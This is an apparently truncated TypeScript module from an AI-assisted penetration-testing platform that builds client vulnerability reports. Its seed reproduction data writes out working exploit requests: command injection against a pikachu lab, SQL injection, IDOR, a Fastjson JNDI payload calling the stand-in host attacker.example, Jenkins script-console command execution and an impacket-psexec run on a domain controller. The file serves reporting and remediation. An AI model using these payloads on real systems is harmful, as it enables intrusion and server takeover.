// 交付域模型（对标 AntiFox 的「证据驱动交付」）。
//
// 目标：让 AI 挖到的漏洞变成工程师看得懂、能复现、带证据、可直接交付客户的报告。
// 三层：
//   1. 富化（Enrichment）      —— 名称 / 资产 / CVSS / 描述 / 影响 / 修复建议
//   2. 结构化复现（Reproduction）—— 入口点 / 前置条件 / 分步请求响应 / 每步证明什么
//   3. 报告（Report）           —— 组织信息 / 模板 / 多语言 / 勾选已确认漏洞 / 交付稿
//
// 后端当前只返回 finding.report(Markdown) 与流量绑定；其余字段在前端先行计算与持久化，
// 接口形状与未来后端一致（GET/PUT /findings/{id}/enrichment 等）。

import { normalizeBurpRequest, normalizeBurpResponse } from "@/lib/burp-format";
import type { Finding, Severity } from "@/lib/types";

export type ReportLocale = "zh-CN" | "zh-TW" | "en-US";

export const LOCALE_LABEL: Record<ReportLocale, string> = {
  "zh-CN": "简体中文",
  "zh-TW": "繁體中文",
  "en-US": "English",
};

export interface Personnel {
  name: string;
  role: string;
  contact: string;
}

export interface ReproStep {
  /** 本步说明（做什么）。 */
  request: string;
  /** 响应/结果原文。 */
  response: string;
  /** 预期结果。 */
  expected: string;
  /** 这一步证明了什么。 */
  proves: string;
  /** 对应录制的流量包 id（原始 exchange），用于一键回看。 */
  traffic_id?: string;
  /** 对应数据重放留痕编号（replay_records.id），报告里据此标注「重放 #N」。 */
  replay_id?: number;
}

export interface Reproduction {
  entry_point?: string;
  prerequisites?: string[];
  steps: ReproStep[];
  /** 数据来源：manual=人工/agent 就地记录；auto=从报告解析；none=待补录。 */
  provenance: "manual" | "auto" | "none";
}

export interface DeliveryEnrichment {
  name: string;
  target: string;
  module: string;
  cvss_score: number;
  cvss_vector: string;
  description: string[];
  risk_analysis: string[];
  remediation: string[];
  source: "auto" | "manual";
}

export interface DeliveryReadiness {
  /** 是否已确认（confirmed / resolved / fixed 视为可交付）。 */
  confirmed: boolean;
  /** 是否已有结构化复现步骤。 */
  has_repro: boolean;
  /** 是否带证据（步骤含请求/响应，或绑定了流量，或原始 evidence 非空）。 */
  has_evidence: boolean;
  /** 是否有描述/影响/修复。 */
  has_narrative: boolean;
  /** 0-4 分，用于排序/展示。 */
  score: number;
}

export interface ReportSettings {
  company_name: string;
  company_name_en: string;
  logo_path: string;
  personnel: Personnel[];
  cvss_version: string;
}

export interface ReportTemplate {
  id: number;
  name: string;
  company_name: string;
  company_name_en: string;
  logo_path: string;
  personnel: Personnel[];
  cvss_version: string;
  locale: ReportLocale;
}

export interface ReportFindingSnapshot {
  id: string;
  name: string;
  severity: Severity;
  status: string;
  target: string;
  cvss_score: number;
  cvss_vector: string;
  description: string[];
  risk_analysis: string[];
  remediation: string[];
  reproduction: Reproduction;
  evidence: string;
  traffic_count: number;
  /** 详细报告（Markdown）。agent 提交的正式报告优先，缺失时为平台自动整理版。 */
  report?: string;
  /** official=agent 提交；auto=平台按证据整理。 */
  report_source?: "official" | "auto";
}

export interface Methodology {
  intro: string;
  phases: { name: string; desc: string }[];
}

export interface ToolItem {
  name: string;
  desc: string;
}

export interface ReportSkeleton {
  methodology: Methodology;
  tools: ToolItem[];
  standards: string[];
}

export interface ReportSnapshot {
  title: string;
  client: string;
  locale: ReportLocale;
  company_name: string;
  company_name_en: string;
  logo_path: string;
  personnel: Personnel[];
  cvss_version: string;
  generated_at: string;
  task_label: string;
  scope: string[];
  methodology: Methodology;
  tools: ToolItem[];
  standards: string[];
  checklist_hits: string[];
  background: string[];
  service_result: string;
  remediation_conclusion: string;
  findings: ReportFindingSnapshot[];
  stats: Record<Severity, number>;
}

export interface ReportRecord {
  id: number;
  task_id?: string;
  task_label: string;
  title: string;
  client: string;
  locale: ReportLocale;
  format: "md" | "print";
  filename: string;
  size: number;
  finding_count: number;
  company: string;
  created_at: string;
  snapshot: ReportSnapshot;
}

// ── 富化推导 ──────────────────────────────────────────────────────────────────

const CLASS_META: { match: RegExp; score: number; vector: string }[] = [
  { match: /sql|注入/i, score: 9.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N" },
  {
    match: /rce|命令执行|代码执行|fastjson|反序列化|jenkins/i,
    score: 9.8,
    vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  },
  {
    match: /域控|完全控制|横向|psexec|提权/i,
    score: 9.8,
    vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
  },
  { match: /上传|upload/i, score: 8.8, vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H" },
  { match: /口令|默认密码|弱口令|credential/i, score: 8.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" },
  { match: /idor|越权/i, score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N" },
  { match: /ssrf/i, score: 7.2, vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N" },
  { match: /xss/i, score: 6.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N" },
  { match: /git|泄露|信息泄露|敏感/i, score: 5.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N" },
];

const GENERIC_IMPACT = [
  "该缺陷可能被攻击者用于绕过既有安全控制，直接影响目标业务的机密性、完整性或可用性。",
  "在授权测试中已确认真实可达；若未修复，可能被进一步组合利用扩大影响面。",
];

const GENERIC_FIX: Record<string, string[]> = {
  sql: [
    "全部数据库访问改用参数化查询或预编译语句，禁止将外部输入拼接到 SQL 中。",
    "为数据库账号执行最小权限原则，关闭生产环境的详细报错回显。",
  ],
  rce: [
    "升级受影响组件到官方修复版本，并移除不必要的反序列化入口。",
    "对命令执行相关接口增加白名单校验与最小权限运行。",
  ],
  idor: [
    "在服务端对每个对象执行归属校验（对象级授权），不要依赖前端传入的 id。",
    "统一在网关/服务层实施资源级访问控制，并补充越权测试用例。",
  ],
  xss: ["对所有输出执行上下文相关的编码，配合 CSP 缓解脚本注入。", "对富文本输入使用白名单过滤。"],
  ad: [
    "轮换域内高权限账号与 krbtgt 密码（按微软建议执行两次重置），并排查持久化票据。",
    "收敛域管权限、启用受保护用户组，补充域内横向与凭据复用的检测规则。",
  ],
  default: [
    "按风险等级修复该缺陷，并在修复后回归验证复现步骤不再成立。",
    "补充该类问题的安全编码规范与自动化检测规则。",
  ],
};

function impactFor(name: string): string[] {
  if (/sql|注入/i.test(name)) {
    return [
      "数据库账号权限范围内的业务数据可被读取或篡改，包含用户与订单等敏感信息。",
      "报错或布尔差异可被用于自动化盲注，进一步扩大数据泄露范围。",
    ];
  }
  if (/rce|命令执行|fastjson|反序列化|jenkins/i.test(name)) {
    return [
      "目标主机可被完全控制，攻击者可执行任意命令并读取应用配置与凭据。",
      "失陷主机可被用作进入内网的跳板，风险从单点扩散到整个网络。",
    ];
  }
  if (/idor|越权/i.test(name)) {
    return [
      "普通用户可读取或操作不属于自己的业务对象，造成横向数据泄露。",
      "对象标识可被批量遍历，影响面覆盖全量用户。",
    ];
  }
  if (/域控|完全控制|横向|psexec/i.test(name)) {
    return [
      "域内核心身份体系已被控制，攻击者可签发任意票据、登录任意加入域的主机。",
      "核心业务系统与数据资产均处于可被完全接管的范围，属于最高等级的业务风险。",
    ];
  }
  if (/xss/i.test(name)) {
    return [
      "攻击者可在受害者浏览器中执行脚本，窃取会话或代替用户执行操作。",
      "可与其他漏洞组合，将低危问题升级为账户接管。",
    ];
  }
  return GENERIC_IMPACT;
}

function pickClassMeta(name: string): { score: number; vector: string } {
  for (const item of CLASS_META) {
    if (item.match.test(name)) return { score: item.score, vector: item.vector };
  }
  return { score: 6.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N" };
}

/** 从 Markdown 报告里按 `## 标题` 切分段落。 */
function mdSections(markdown?: string): Record<string, string[]> {
  const result: Record<string, string[]> = {};
  if (!markdown) return result;
  let current = "";
  for (const raw of markdown.split("\n")) {
    const line = raw.trimEnd();
    const heading = /^##\s+(.+)$/.exec(line.trim());
    if (heading) {
      current = heading[1].trim();
      result[current] = [];
      continue;
    }
    if (!current) continue;
    if (line.trim()) result[current].push(line.trim());
  }
  return result;
}

function cleanInline(text: string): string {
  return text
    .replace(/\*\*(.+?)\*\*/g, "$1")
    .replace(/`([^`]+)`/g, "$1")
    .replace(/\[(.+?)\]\((.+?)\)/g, "$1")
    .trim();
}

function bullets(lines: string[] | undefined): string[] {
  if (!lines) return [];
  return lines
    .map((line) =>
      cleanInline(
        line
          .replace(/^[-*]\s+/, "")
          .replace(/^\d+\.\s+/, "")
          .trim(),
      ),
    )
    .filter(Boolean)
    .filter((line) => !line.startsWith("```"));
}

/** 从发现推导交付所需的富化内容；有 report 时优先复用其中的叙述。 */
export function deriveEnrichment(finding: Finding): DeliveryEnrichment {
  const sections = mdSections(finding.report);
  const description = bullets(sections["漏洞概述"]);
  const impact = bullets(sections["影响"] ?? sections["风险分析"] ?? sections["危害"]);
  const remediation = bullets(sections["修复建议"] ?? sections["修复方案"] ?? sections["加固建议"]);
  const trimmedName = finding.name?.trim();
  const trimmedClass = finding.vulnclass?.trim();
  const name = trimmedName ? trimmedName : trimmedClass ? trimmedClass : "未命名漏洞";
  const meta = pickClassMeta(name);
  const cls = name.toLowerCase();
  let fix = GENERIC_FIX.default;
  if (/sql|注入/.test(cls)) fix = GENERIC_FIX.sql;
  else if (/rce|命令执行|代码执行|fastjson|反序列化/.test(cls)) fix = GENERIC_FIX.rce;
  else if (/idor|越权/.test(cls)) fix = GENERIC_FIX.idor;
  else if (/xss/.test(cls)) fix = GENERIC_FIX.xss;
  else if (/域控|完全控制|横向|psexec/i.test(cls)) fix = GENERIC_FIX.ad;

  return {
    name,
    target: finding.assets?.[0]?.label ?? finding.task_description ?? "—",
    module: finding.vulnclass || "Web",
    cvss_score: meta.score,
    cvss_vector: meta.vector,
    description: description.length
      ? description
      : [finding.summary || "（暂无漏洞描述，请在「编辑交付内容」中补充。）"],
    risk_analysis: impact.length ? impact : impactFor(name),
    remediation: remediation.length ? remediation : fix,
    source: description.length || impact.length || remediation.length ? "auto" : "auto",
  };
}

// ── 复现推导 ──────────────────────────────────────────────────────────────────
//
// 重点样本（SQLi / IDOR / Fastjson / Jenkins / 横向）直接内置人工级步骤；
// 其余从 finding.report 的「复现步骤」章节解析，或退化为原始证据单步。

const REPRO_SEEDS: Record<string, Reproduction> = {
  // 655：pikachu RCE（命令注入 + 代码注入）。步骤响应取自数据重放留痕 #10/#11/#12
  // 的真实回显，可在「数据重放」页按记录 id 复查原始请求与响应。
  "655": {
    entry_point: "http://localhost/pikachu/vul/rce/rce_ping.php（无鉴权 POST）",
    prerequisites: ["目标为本地隔离 pikachu 实例", "无需登录态（页面无 session 校验）"],
    provenance: "manual",
    steps: [
      {
        request:
          "POST /pikachu/vul/rce/rce_ping.php HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\n\nsubmit=ping&ipaddress=127.0.0.1",
        response:
          "HTTP/1.1 200 OK\n正在 Ping 127.0.0.1 具有 32 字节的数据:\n127.0.0.1 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0",
        expected: "正常 ping，作为基线对照。",
        traffic_id: "12",
        replay_id: 12,
        proves: "接口按 ipaddress 原样执行 ping，基线可用（重放记录 #12）。",
      },
      {
        request:
          "POST /pikachu/vul/rce/rce_ping.php HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\n\nsubmit=ping&ipaddress=localhost+%26+echo+PIKA_PING_MARK_1+%26+whoami+%26+ver",
        response:
          "HTTP/1.1 200 OK\n<pre>正在 Ping demo-host [::1] 具有 32 字节的数据:\n::1 的 Ping 统计信息:\nPIKA_PING_MARK_1\ndemo\\\\user\nMicrosoft Windows [版本 10.0.19045.0]</pre>",
        expected: "& 截断 ping 后追加执行 echo / whoami / ver。",
        traffic_id: "10",
        replay_id: 10,
        proves: "任意系统命令执行确认（重放记录 #10，3129 ms，34 KB 响应）。",
      },
      {
        request:
          "POST /pikachu/vul/rce/rce_eval.php HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\n\nsubmit=submit&txt=echo+%22PIKA_EVAL_MARK_1%22%3B+system(%22whoami%22)%3B",
        response: "HTTP/1.1 200 OK\nPIKA_EVAL_MARK_1demo\\\\user",
        expected: "txt 被 eval() 当 PHP 代码执行。",
        traffic_id: "11",
        replay_id: 11,
        proves: "任意 PHP 代码执行（重放记录 #11，102 ms）。",
      },
    ],
  },
  "f-1": {
    entry_point: "https://www.acme.com/search?q=",
    prerequisites: ["目标前台搜索接口可直接访问", "无需登录态"],
    provenance: "manual",
    steps: [
      {
        request: "GET /search?q=book HTTP/1.1\nHost: www.acme.com\nUser-Agent: ARTEX-scanner/1.0\nAccept: text/html",
        response: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class="results">共 128 条结果…</div>',
        expected: "正常返回搜索结果，作为基线。",
        proves: "确认 q 参数进入业务查询且无前置鉴权。",
      },
      {
        request:
          "GET /search?q=1%27%20AND%201%3DCONVERT(int%2C%40%40version)-- HTTP/1.1\nHost: www.acme.com\nAccept: */*",
        response:
          "HTTP/1.1 500 Internal Server Error\nContent-Type: text/html\n\nConversion failed when converting the nvarchar value 'Microsoft SQL Server 2019 (15.0.2000.5)' to data type int.",
        expected: "响应出现 MSSQL 类型转换报错。",
        proves: "q 参数被拼接进 SQL 且详细报错回显，可确认注入点。",
        traffic_id: "x-2",
      },
      {
        request:
          "GET /search?q=1%27%20AND%201%3D(SELECT%20TOP%201%20COUNT(*)%20FROM%20users)-- HTTP/1.1\nHost: www.acme.com\nAccept: */*",
        response: "HTTP/1.1 500 Internal Server Error\n\n…Subquery returned more than 1 value…",
        expected: "通过布尔/报错差异推断数据。",
        proves: "可进一步读取业务库结构与用户数据，影响面已确认。",
      },
    ],
  },
  "f-2": {
    entry_point: "https://api.acme.com/v1/orders?id=<订单ID>",
    prerequisites: ["持有任意普通用户 Token", "已知自己的订单 ID"],
    provenance: "manual",
    steps: [
      {
        request:
          "GET /v1/orders?id=1001 HTTP/1.1\nHost: api.acme.com\nAuthorization: Bearer <本人 Token>\nAccept: application/json",
        response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"order_id":1001,"user_id":42,"amount":199.00}',
        expected: "正常读取本人订单，作为对照。",
        proves: "接口按 id 直接查询，未见归属参数。",
        traffic_id: "x-8",
      },
      {
        request:
          "GET /v1/orders?id=1002 HTTP/1.1\nHost: api.acme.com\nAuthorization: Bearer <本人 Token>\nAccept: application/json",
        response:
          'HTTP/1.1 200 OK\n\n{"order_id":1002,"user_id":77,"amount":1299.00,"address":"北京市朝阳区 ****","phone":"138****6021"}',
        expected: "返回他人订单详情。",
        proves: "服务端缺少对象级授权，可越权读取任意订单（含手机号/地址）。",
        traffic_id: "x-9",
      },
    ],
  },
  "f-12": {
    entry_point: "POST https://api.acme.com/v1/profile",
    prerequisites: ["Fastjson 版本 < 1.2.83", "接口接受 JSON 且 autoType 未禁用"],
    provenance: "manual",
    steps: [
      {
        request:
          'POST /v1/profile HTTP/1.1\nHost: api.acme.com\nContent-Type: application/json\n\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}',
        response: 'HTTP/1.1 200 OK\n\n{"status":"error","message":"internal server error"}',
        expected: "服务端发起 LDAP 外连。",
        proves: "@type 反序列化被触发，收到 JNDI 回连。",
        traffic_id: "x-15",
      },
      {
        request: "（LDAP 侧）回连记录：attacker.example 收到来自 10.20.3.18 的 JNDI 请求",
        response: "id 命令回显：uid=0(root) gid=0(root) groups=0(root)",
        expected: "命令执行成功。",
        proves: "反序列化链可执行任意命令，目标主机已失陷。",
        traffic_id: "x-16",
      },
    ],
  },
  "f-15": {
    entry_point: "http://admin.acme.com:8080/script",
    prerequisites: ["Jenkins Script Console 未授权访问"],
    provenance: "manual",
    steps: [
      {
        request: "GET /script HTTP/1.1\nHost: admin.acme.com:8080\nAccept: text/html",
        response: "HTTP/1.1 200 OK\n\n<html>…Groovy script console…</html>",
        expected: "未登录直接进入 Script Console。",
        proves: "管理接口未做鉴权，可执行任意 Groovy。",
        traffic_id: "x-17",
      },
      {
        request:
          "POST /script HTTP/1.1\nHost: admin.acme.com:8080\nContent-Type: application/x-www-form-urlencoded\n\nscript=println(%22id%22.execute().text)",
        response: "HTTP/1.1 200 OK\n\nuid=0(root) gid=0(root) groups=0(root)",
        expected: "命令回显。",
        proves: "未授权命令执行，直接获取服务器权限。",
        traffic_id: "x-18",
      },
    ],
  },
  "f-17": {
    entry_point: "域内主机 → DC01（10.20.0.10）",
    prerequisites: ["已获取 svc_deploy 凭据", "可达 445/TCP"],
    provenance: "manual",
    steps: [
      {
        request: "impacket-psexec 'ACME/svc_deploy:****@10.20.0.10'\n# SMB 认证成功，创建服务 psexecsvc",
        response:
          "Impacket v0.11.0 - Copyright 2023 Fortra\n[*] Requesting shares on 10.20.0.10.....\n[*] Found writable share ADMIN$\n[!] Launching semi-interactive shell",
        expected: "获得域控 SYSTEM 权限。",
        proves: "凭据可复用至域控，攻击链抵达核心资产。",
        traffic_id: "x-19",
      },
    ],
  },
};

function parseReproFromReport(finding: Finding): Reproduction | null {
  const sections = mdSections(finding.report);
  const body = sections["复现步骤"] ?? sections["复现过程"] ?? sections["验证过程"];
  if (!body || body.length === 0) return null;
  const steps: ReproStep[] = [];
  let currentText: string[] = [];
  let code: string[] = [];
  let inCode = false;
  const push = () => {
    const text = currentText.join(" ").trim();
    if (!text && code.length === 0) return;
    steps.push({
      request: code.join("\n").trim(),
      response: "",
      expected: text || `执行第 ${steps.length + 1} 步验证。`,
      proves: "报告将该步骤记录为可复现证据。",
    });
    currentText = [];
    code = [];
  };
  for (const line of body) {
    if (line.startsWith("```")) {
      if (inCode) {
        inCode = false;
      } else {
        inCode = true;
      }
      continue;
    }
    if (inCode) {
      code.push(line);
      continue;
    }
    if (/^\d+\.\s/.test(line)) {
      push();
      currentText.push(line.replace(/^\d+\.\s+/, ""));
    } else {
      currentText.push(line);
    }
  }
  push();
  if (steps.length === 0) return null;
  return { steps, provenance: "auto" };
}

export function deriveReproduction(finding: Finding): Reproduction {
  const seeded = REPRO_SEEDS[finding.id];
  if (seeded) return seeded;
  const parsed = parseReproFromReport(finding);
  if (parsed) return parsed;
  if (finding.evidence?.trim()) {
    return {
      provenance: "none",
      steps: [
        {
          request: finding.evidence.trim(),
          response: "",
          expected: finding.summary || "按证据复现该漏洞。",
          proves: "agent 记录的原始证据，尚未整理为分步复现。",
        },
      ],
    };
  }
  return { provenance: "none", steps: [] };
}

// ── 交付就绪度 ────────────────────────────────────────────────────────────────

const DELIVERABLE_STATUS = new Set(["confirmed", "resolved", "fixed"]);

export function deliveryReadiness(
  finding: Finding,
  enrichment: DeliveryEnrichment,
  reproduction: Reproduction,
): DeliveryReadiness {
  const confirmed = DELIVERABLE_STATUS.has(finding.status);
  const has_repro =
    reproduction.provenance !== "none" &&
    reproduction.steps.length > 0 &&
    reproduction.steps.some((step) => step.request.trim().length > 0 || step.response.trim().length > 0);
  const has_evidence =
    reproduction.steps.some((step) => step.request.trim() && step.response.trim()) ||
    (finding.traffic_count ?? 0) > 0 ||
    Boolean(finding.evidence?.trim());
  const has_narrative =
    enrichment.description.length > 0 && enrichment.risk_analysis.length > 0 && enrichment.remediation.length > 0;
  const score = [confirmed, has_repro, has_evidence, has_narrative].filter(Boolean).length;
  return { confirmed, has_repro, has_evidence, has_narrative, score };
}

export function readinessLabel(readiness: DeliveryReadiness): { label: string; tone: "green" | "amber" | "slate" } {
  if (readiness.score >= 4) return { label: "可交付", tone: "green" };
  if (!readiness.confirmed) return { label: "未确认", tone: "slate" };
  if (!readiness.has_repro) return { label: "缺复现", tone: "amber" };
  if (!readiness.has_evidence) return { label: "缺证据", tone: "amber" };
  return { label: "待完善", tone: "amber" };
}

// ── 报告快照与 Markdown ───────────────────────────────────────────────────────

export function buildFindingSnapshot(
  finding: Finding,
  enrichment: DeliveryEnrichment,
  reproduction: Reproduction,
): ReportFindingSnapshot {
  return {
    id: finding.id,
    name: enrichment.name,
    severity: finding.severity,
    status: finding.status,
    target: enrichment.target,
    cvss_score: enrichment.cvss_score,
    cvss_vector: enrichment.cvss_vector,
    description: enrichment.description,
    risk_analysis: enrichment.risk_analysis,
    remediation: enrichment.remediation,
    reproduction,
    evidence: finding.evidence,
    traffic_count: finding.traffic_count ?? 0,
    report: finding.report?.trim() || undefined,
    report_source: finding.report?.trim() ? "official" : undefined,
  };
}

// ── 报告骨架（方法学 / 工具 / 标准 / 测试清单） ──────────────────────────────
// 内容对齐 AntiFox report-generation skill：PTES 八阶段、工具清单、参考规范，
// 以及按漏洞类型命中的标准测试项（报告中呈现为「不通过」）。

const SKELETON_ZH: ReportSkeleton = {
  methodology: {
    intro:
      "渗透测试服务流程依托国际公认的渗透测试执行标准 PTES（Penetration Testing Execution Standard），确保每次服务标准化、高质量地进行。流程包含以下 8 个阶段：",
    phases: [
      { name: "前期沟通", desc: "立项准备，双方协商测试范围与具体测试项，完成授权确认及人员、工具准备。" },
      { name: "信息收集", desc: "围绕授权资产开展公开信息收集、资产测绘与站点结构分析，制定渗透测试实施方案。" },
      { name: "威胁建模", desc: "分析业务资产与流程，评估威胁对象与能力，识别主要攻击面与风险路径。" },
      { name: "漏洞分析", desc: "结合工具扫描结果进行关联分析与人工验证，在受控环境中复现，得出分析结论。" },
      { name: "渗透攻击", desc: "根据分析结果选择最佳攻击路径，进行低影响的精准验证，确认风险真实性。" },
      { name: "后渗透攻击", desc: "在授权范围内评估漏洞被利用后的横向移动、权限提升与敏感数据可达性。" },
      { name: "提交报告", desc: "整理漏洞详情、证据、CVSS 评分与风险定级，输出可交付的渗透测试报告。" },
      { name: "加固防护", desc: "在报告基础上配合客户完成整改，并在需要时开展复测以确认漏洞闭环。" },
    ],
  },
  tools: [
    { name: "Burp Suite", desc: "Web 应用攻击测试集成平台，作为本次测试的核心代理与抓包工具。" },
    { name: "SQLMap", desc: "SQL 注入漏洞检测与利用工具。" },
    { name: "Nmap", desc: "网络端口扫描与服务识别工具。" },
    { name: "Nuclei", desc: "基于模板的漏洞扫描器，用于批量指纹与漏洞验证。" },
    { name: "cURL / httpie", desc: "命令行 HTTP 请求构造与响应分析工具。" },
    { name: "Wappalyzer / EHole", desc: "Web 应用框架与指纹识别工具。" },
    { name: "自研 POC 库", desc: "内部维护的漏洞验证脚本库，配合本地漏洞库索引使用。" },
  ],
  standards: [
    "《GB/T 25069-2022 信息安全技术 术语》",
    "《GB/T 22239-2019 信息安全技术 网络安全等级保护基本要求》",
    "《GB/T 28448-2019 信息安全技术 网络安全等级保护测评要求》",
    "《GB/T 20271-2006 信息安全技术 信息系统通用安全技术要求》",
    "PTES（Penetration Testing Execution Standard）",
    "OWASP Top 10：2021",
  ],
};

const SKELETON_EN: ReportSkeleton = {
  methodology: {
    intro:
      "The engagement follows PTES (Penetration Testing Execution Standard) so that every assessment is delivered consistently and at high quality. The process consists of eight phases:",
    phases: [
      { name: "Pre-engagement", desc: "Scoping, authorization, personnel and tooling preparation with the client." },
      {
        name: "Intelligence gathering",
        desc: "OSINT, asset mapping and site structure analysis across the authorized scope.",
      },
      { name: "Threat modeling", desc: "Identify business assets, threat actors and the most likely attack paths." },
      {
        name: "Vulnerability analysis",
        desc: "Correlate scanner output with manual verification and reproduce findings in a controlled manner.",
      },
      { name: "Exploitation", desc: "Validate the most promising paths with low-impact, targeted exploitation." },
      {
        name: "Post-exploitation",
        desc: "Within scope, assess lateral movement, privilege escalation and sensitive data reachability.",
      },
      {
        name: "Reporting",
        desc: "Document findings, evidence, CVSS scoring and risk rating into a deliverable report.",
      },
      {
        name: "Remediation support",
        desc: "Support remediation and perform retesting to confirm findings are closed.",
      },
    ],
  },
  tools: [
    { name: "Burp Suite", desc: "Integrated web application testing platform used as the primary proxy." },
    { name: "SQLMap", desc: "Open-source tool for detecting and exploiting SQL injection." },
    { name: "Nmap", desc: "Network port scanning and service identification." },
    { name: "Nuclei", desc: "Template-based scanner for fingerprinting and vulnerability validation." },
    { name: "cURL / httpie", desc: "Command-line HTTP request construction and response analysis." },
    { name: "Wappalyzer / EHole", desc: "Web framework and fingerprint identification." },
    { name: "In-house PoC library", desc: "Internal validation scripts backed by a local vulnerability index." },
  ],
  standards: [
    "GB/T 25069-2022 Information security technology — Terminology",
    "GB/T 22239-2019 Baseline for classified protection of cybersecurity",
    "GB/T 28448-2019 Evaluation requirements for classified protection of cybersecurity",
    "GB/T 20271-2006 General security technical requirements for information systems",
    "PTES (Penetration Testing Execution Standard)",
    "OWASP Top 10: 2021",
  ],
};

function skeletonFor(locale: ReportLocale): ReportSkeleton {
  return locale === "en-US" ? SKELETON_EN : SKELETON_ZH;
}

const CHECKLIST_CATALOG: { match: RegExp; cn: string; tw: string; en: string }[] = [
  {
    match: /命令执行|代码执行|命令注入|rce|fastjson|反序列化/i,
    cn: "命令注入",
    tw: "命令注入",
    en: "Command Injection",
  },
  { match: /sql|注入/i, cn: "SQL 注入", tw: "SQL 注入", en: "SQL Injection" },
  { match: /xss|跨站脚本/i, cn: "跨站脚本攻击（XSS）", tw: "跨站腳本攻擊（XSS）", en: "Cross-Site Scripting (XSS)" },
  { match: /上传|upload/i, cn: "任意文件上传", tw: "任意文件上傳", en: "Arbitrary File Upload" },
  { match: /文件下载|文件读取|任意读/i, cn: "任意文件下载", tw: "任意文件下載", en: "Arbitrary File Download" },
  { match: /idor|水平越权/i, cn: "水平越权访问", tw: "水平越權訪問", en: "Horizontal Privilege Escalation (IDOR)" },
  { match: /垂直越权/i, cn: "垂直越权访问", tw: "垂直越權訪問", en: "Vertical Privilege Escalation" },
  { match: /未授权/i, cn: "未授权访问", tw: "未授權訪問", en: "Unauthorized Access" },
  { match: /\.git/i, cn: ".git 源码泄漏", tw: ".git 源碼洩漏", en: ".git Source Code Leak" },
  {
    match: /敏感信息|信息泄露|敏感数据/i,
    cn: "敏感信息泄露",
    tw: "敏感資訊洩漏",
    en: "Sensitive Information Disclosure",
  },
  { match: /弱口令|默认口令|默认密码|口令/i, cn: "弱口令", tw: "弱口令", en: "Weak Credentials" },
  { match: /认证绕过|登录绕过|鉴权绕过/i, cn: "登录认证绕过", tw: "登入認證繞過", en: "Authentication Bypass" },
  {
    match: /ssrf|服务端请求伪造/i,
    cn: "服务端请求伪造（SSRF）",
    tw: "服務端請求偽造（SSRF）",
    en: "Server-Side Request Forgery (SSRF)",
  },
  { match: /xxe|外部实体/i, cn: "XML 外部实体注入", tw: "XML 外部實體注入", en: "XML External Entity (XXE)" },
  { match: /目录遍历|路径遍历/i, cn: "目录遍历", tw: "目錄遍歷", en: "Directory Traversal" },
  {
    match: /备份文件|测试文件/i,
    cn: "测试、备份文件泄露",
    tw: "測試、備份檔案洩漏",
    en: "Test/Backup File Disclosure",
  },
  { match: /控制台|console/i, cn: "Web 控制台泄漏", tw: "Web 控制台洩漏", en: "Web Console Exposure" },
  { match: /暴力破解|爆破/i, cn: "暴力破解", tw: "暴力破解", en: "Brute Force" },
  { match: /cors/i, cn: "CORS 跨域资源共享漏洞", tw: "CORS 跨域資源共享漏洞", en: "CORS Misconfiguration" },
  { match: /csrf/i, cn: "跨站请求伪造（CSRF）", tw: "跨站請求偽造（CSRF）", en: "Cross-Site Request Forgery (CSRF)" },
];

function checklistHits(findings: ReportFindingSnapshot[], locale: ReportLocale): string[] {
  const hits: string[] = [];
  const seen = new Set<string>();
  for (const finding of findings) {
    for (const item of CHECKLIST_CATALOG) {
      if (!item.match.test(finding.name)) continue;
      const label = locale === "en-US" ? item.en : locale === "zh-TW" ? item.tw : item.cn;
      if (seen.has(label)) continue;
      seen.add(label);
      hits.push(label);
    }
  }
  return hits;
}

function severityText(locale: ReportLocale, severity: Severity): string {
  if (locale === "en-US") {
    return { critical: "critical", high: "high", medium: "medium", low: "low" }[severity];
  }
  if (locale === "zh-TW") {
    return { critical: "嚴重", high: "高危", medium: "中危", low: "低危" }[severity];
  }
  return SEVERITY_LABEL[severity];
}

function buildNarrative(input: {
  locale: ReportLocale;
  client: string;
  company: string;
  taskLabel: string;
  findings: ReportFindingSnapshot[];
  stats: Record<Severity, number>;
}): { background: string[]; service_result: string; remediation_conclusion: string; checklist_hits: string[] } {
  const total = input.findings.length;
  const parts = (["critical", "high", "medium", "low"] as Severity[])
    .filter((severity) => input.stats[severity] > 0)
    .map((severity) => `${severityText(input.locale, severity)} ${input.stats[severity]}`);
  const hits = checklistHits(input.findings, input.locale);

  if (input.locale === "en-US") {
    return {
      background: [
        `${input.client || "The client"} commissioned ${input.company} to conduct a penetration test against ${input.taskLabel || "the authorized target"}. The objective was to validate the real-world exploitability of security weaknesses and to provide evidence that engineering teams can reproduce and fix.`,
        "The assessment combined manual verification with tool-assisted discovery. Every reported issue was reproduced with the recorded request/response pair, and evidence was retained for each step of the exploitation path.",
      ],
      service_result: `The assessment validated ${total} vulnerabilities${parts.length ? ` (${parts.join(", ")})` : ""}. Findings are documented with CVSS scoring, affected assets, step-by-step reproduction and remediation guidance.`,
      remediation_conclusion:
        "All findings are currently open and should be remediated as a priority. We recommend scheduling a retest after remediation to confirm each issue is closed.",
      checklist_hits: hits,
    };
  }

  const tw = input.locale === "zh-TW";
  return {
    background: [
